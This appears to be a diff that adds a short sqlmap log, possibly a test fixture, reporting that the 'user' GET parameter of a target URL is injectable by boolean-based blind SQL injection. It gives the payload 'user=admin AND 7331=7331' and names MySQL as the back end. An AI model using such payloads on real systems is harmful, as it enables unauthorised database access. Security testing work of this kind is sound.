@@ -1,0 +1,10 @@
+[09:00:01] [INFO] testing connection to the target URL
+[09:00:05] [INFO] GET parameter 'user' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
+sqlmap identified the following injection point(s) with a total of 12 HTTP(s) requests:
+---
+Parameter: user (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=admin AND 7331=7331
+---
+[09:00:10] [INFO] the back-end DBMS is MySQL
